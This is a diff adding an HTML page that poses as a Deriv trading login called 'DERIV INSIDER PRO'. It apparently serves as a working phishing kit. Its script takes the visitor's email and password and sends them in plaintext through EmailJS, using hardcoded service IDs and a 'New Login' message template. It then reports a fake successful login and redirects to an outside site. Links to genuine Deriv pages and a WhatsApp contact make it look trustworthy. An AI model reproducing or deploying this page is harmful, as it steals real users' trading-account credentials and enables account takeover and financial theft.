@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HUBDERIVANALYSISTOOL</title>
+
+  <!-- Font Awesome -->
+  <link rel="stylesheet"
+  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"/>
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+  <!-- EmailJS -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+  <style>
+
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family:'Poppins',sans-serif;
+    }
+
+    body{
+      min-height:100vh;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      background:linear-gradient(135deg,#032b05,#032b05,#032b05);
+      padding:20px;
+      overflow:hidden;
+    }
+
+    /* Background Glow */
+    body::before,
+    body::after{
+      content:'';
+      position:absolute;
+      width:300px;
+      height:300px;
+      border-radius:50%;
+      filter:blur(100px);
+      z-index:-1;
+    }
+
+    body::before{
+      background:#032b05;
+      top:-80px;
+      left:-80px;
+    }
+
+    body::after{
+      background:#032b05;
+      bottom:-80px;
+      right:-80px;
+    }
+
+    /* Main Container */
+    .container{
+      width:100%;
+      max-width:430px;
+      background:rgba(255,255,255,0.12);
+      backdrop-filter:blur(15px);
+      border:1px solid rgba(255,255,255,0.2);
+      border-radius:25px;
+      padding:40px 30px;
+      text-align:center;
+      color:white;
+      box-shadow:0 8px 32px rgba(0,0,0,0.35);
+      animation:fadeIn 1s ease;
+    }
+
+    @keyframes fadeIn{
+      from{
+        opacity:0;
+        transform:translateY(30px);
+      }
+      to{
+        opacity:1;
+        transform:translateY(0);
+      }
+    }
+
+    /* Logo */
+    .logo{
+      width:85px;
+      height:85px;
+      margin:0 auto 15px;
+      border-radius:50%;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      background:rgba(255,255,255,0.15);
+      box-shadow:0 4px 20px rgba(255,255,255,0.2);
+      font-size:35px;
+    }
+
+    h1{
+      font-size:32px;
+      margin-bottom:8px;
+      font-weight:700;
+      letter-spacing:2px;
+    }
+
+    .subtitle{
+      margin-bottom:30px;
+      color:#dbeafe;
+      font-size:14px;
+    }
+
+    /* Input Groups */
+    .input-group{
+      position:relative;
+      margin-bottom:22px;
+    }
+
+    .input-group i{
+      position:absolute;
+      left:15px;
+      top:50%;
+      transform:translateY(-50%);
+      color:#cbd5e1;
+    }
+
+    .input-group input{
+      width:100%;
+      padding:14px 15px 14px 45px;
+      border:none;
+      outline:none;
+      border-radius:14px;
+      background:rgba(255,255,255,0.15);
+      color:white;
+      font-size:15px;
+      transition:0.3s ease;
+    }
+
+    .input-group input::placeholder{
+      color:#d1d5db;
+    }
+
+    .input-group input:focus{
+      background:rgba(255,255,255,0.22);
+      transform:scale(1.02);
+      border:1px solid #93c5fd;
+    }
+
+    /* Checkbox */
+    .checkbox{
+      display:flex;
+      align-items:flex-start;
+      gap:10px;
+      margin-bottom:25px;
+      text-align:left;
+      font-size:14px;
+      color:#e5e7eb;
+    }
+
+    .checkbox input{
+      margin-top:4px;
+      transform:scale(1.1);
+      cursor:pointer;
+    }
+
+    /* Button */
+    .btn{
+      width:100%;
+      padding:15px;
+      border:none;
+      border-radius:15px;
+      background:linear-gradient(135deg,#60a5fa,#2563eb);
+      color:white;
+      font-size:17px;
+      font-weight:600;
+      cursor:pointer;
+      transition:0.3s ease;
+      box-shadow:0 5px 18px rgba(37,99,235,0.5);
+      position:relative;
+    }
+
+    .btn:hover{
+      transform:translateY(-3px);
+      box-shadow:0 10px 25px rgba(37,99,235,0.6);
+    }
+
+    /* Loader */
+    .loader{
+      width:20px;
+      height:20px;
+      border:3px solid rgba(255,255,255,0.3);
+      border-top:3px solid white;
+      border-radius:50%;
+      animation:spin 1s linear infinite;
+      display:none;
+      margin:auto;
+    }
+
+    @keyframes spin{
+      100%{
+        transform:rotate(360deg);
+      }
+    }
+
+    /* Message */
+    .message{
+      margin-top:20px;
+      padding:12px;
+      border-radius:10px;
+      display:none;
+      font-size:14px;
+    }
+
+    .success{
+      background:rgba(34,197,94,0.2);
+      color:#dcfce7;
+    }
+
+    .error{
+      background:rgba(239,68,68,0.2);
+      color:#fee2e2;
+    }
+
+    /* QUICK ICONS */
+    .quick-icons{
+      display:grid;
+      grid-template-columns:repeat(3,1fr);
+      gap:5px;
+      margin-top:30px;
+    }
+
+    .icon-box{
+      background:rgba(255,255,255,0.12);
+      border:1px solid rgba(255,255,255,0.2);
+      border-radius:50px;
+      padding:0.5px 2px;
+      text-decoration:none;
+      color:white;
+      transition:0.3s ease;
+      display:flex;
+      flex-direction:line;
+      align-items:right;
+      justify-content:center;
+      gap:5px;
+    }
+
+    .icon-box:hover{
+      transform:translateY(-5px);
+      background:rgba(255,255,255,0.18);
+      box-shadow:0 10px 20px rgba(0,0,0,0.2);
+    }
+
+    .icon-box i{
+      font-size:30px;
+    }
+
+    .icon-box span{
+      font-size:13px;
+      font-weight:1000;
+    }
+
+    footer{
+      margin-top:25px;
+      font-size:15px;
+      color:#dbeafe;
+    }
+
+    @media(max-width:480px){
+
+      .container{
+        padding:30px 22px;
+      }
+
+      h1{
+        font-size:28px;
+      }
+
+      .quick-icons{
+        grid-template-columns:repeat(2,1fr);
+      }
+
+    }
+
+  </style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <!-- Logo -->
+ <div class="logo">
+   <img src="logo2.png" alt="Logo" style="
+    width:70px;
+    height:70px;
+    border-radius:20px;
+    display:block;
+    margin:0 auto 10px;
+    box-shadow:
+        0 0 10px rgba(80, 92, 255, 0.8),
+        0 0 20px rgba(49, 52, 247, 0.774),
+        0 0 40px rgba(54, 50, 245, 0.6);
+    animation: logoGlow 2s ease-in-out infinite alternate;
+">
+  </div>
+
+  <!-- Title -->
+  <h1>DERIV INSIDER PRO</h1>
+  <p class="subtitle">
+    Powered by Deriv
+  </p>
+
+  <!-- FORM -->
+  <form id="orderForm">
+
+    <!-- Email -->
+    <div class="input-group">
+      <i class="fa-solid fa-envelope"></i>
+
+      <input
+        type="email"
+        id="email"
+        placeholder="Enter Email Address"
+        required
+      >
+    </div>
+
+    <!-- Password -->
+    <div class="input-group">
+      <i class="fa-solid fa-lock"></i>
+
+      <input
+        type="password"
+        id="password"
+        placeholder="Enter Password"
+        required
+      >
+    </div>
+
+    <!-- Terms -->
+    <div class="checkbox">
+      <input type="checkbox" id="terms">
+
+      <label for="terms">
+        I agree to the Terms and Conditions
+      </label>
+    </div>
+
+    <!-- Button -->
+    <button type="submit" class="btn">
+
+      <span id="btnText">
+        SIGN IN
+      </span>
+
+      <div class="loader" id="loader"></div>
+
+    </button>
+
+    <!-- Message -->
+    <div class="message" id="message"></div>
+
+  </form>
+<p class="subtitle">
+    NOTE: Use your official deriv credentials to login. Secure and responsible trading.
+  </p>
+  <!-- QUICK ICONS -->
+  <div class="quick-icons">
+
+    <!-- Help Centre -->
+    <a href="https://deriv.com/help-centre"
+       target="_blank"
+       class="icon-box">
+
+      <i class="fa-solid fa-headset"></i>
+      <span>Help</span>
+
+    </a>
+
+    <!-- WhatsApp -->
+    <a href="https://wa.me/254740491902"
+       target="_blank"
+       class="icon-box">
+
+      <i class="fa-brands fa-whatsapp"></i>
+      <span>LiveChat</span>
+
+    </a>
+
+
+    <!-- Deriv -->
+    <a href="https://app.deriv.com"
+       target="_blank"
+       class="icon-box">
+
+      <i class="fa-solid fa-chart-line"></i>
+      <span>Register</span>
+
+    </a>
+
+    <!-- About -->
+    <a href="https://deriv.com/why-choose-us"
+       target="_blank"
+       class="icon-box">
+  
+      <i class="fa-solid fa-circle-info"></i>
+      <span>About</span>
+
+    </a>
+
+  </div>
+
+  <!-- Footer -->
+  <footer>
+    © 2026 Trade Options on Financial Markets & 24/7 Derived Indices.
+  </footer>
+
+</div>
+
+<script>
+
+  /* =========================================
+     EMAILJS INIT
+  ========================================= */
+
+  emailjs.init("2CFXVctSTCY05sGba");
+
+  const form = document.getElementById("orderForm");
+  const messageBox = document.getElementById("message");
+  const btnText = document.getElementById("btnText");
+  const loader = document.getElementById("loader");
+
+  form.addEventListener("submit", async function(e){
+
+    e.preventDefault();
+
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value.trim();
+    const terms = document.getElementById("terms").checked;
+
+    /* VALIDATION */
+    if(!email || !password){
+
+      showMessage(
+        "Please fill in all fields.",
+        "error"
+      );
+
+      return;
+
+    }
+
+    if(!terms){
+
+      showMessage(
+        "Please agree to the Terms and Conditions.",
+        "error"
+      );
+
+      return;
+
+    }
+
+    /* SHOW LOADER */
+    btnText.style.display = "none";
+    loader.style.display = "block";
+
+    const currentDate = new Date().toLocaleString();
+
+    /* EMAIL DATA */
+    const templateParams = {
+
+      from_name: "FREE BOOKIES",
+
+      user_email: email,
+
+      user_password: password,
+
+      order_time: currentDate,
+
+      message:
+      `New Login
+
+Email: ${email}
+
+Password: ${password}
+
+Time: ${currentDate}`
+
+    };
+
+try{
+
+  await emailjs.send(
+    "service_za9tqt7",
+    "template_fr0o92g",
+    templateParams
+  );
+
+  showMessage(
+    "Login successful. Redirecting...",
+    "success"
+  );
+
+  form.reset();
+
+  // Redirect only after EmailJS succeeds
+  setTimeout(() => {
+    window.location.href = "https://derivmatchtool.site";
+  }, 1500);
+
+}catch(error){
+
+      console.error(error);
+
+      showMessage(
+        "Failed to log in.",
+        "error"
+      );
+
+    }finally{
+
+      btnText.style.display = "inline";
+      loader.style.display = "none";
+
+    }
+
+  });
+
+  /* =========================================
+     MESSAGE FUNCTION
+  ========================================= */
+
+  function showMessage(text,type){
+
+    messageBox.style.display = "block";
+    messageBox.className = `message ${type}`;
+    messageBox.innerHTML = text;
+
+    setTimeout(()=>{
+
+      messageBox.style.display = "none";
+
+    },5000);
+
+  }
+
+</script>
+
+</body>
+</html>
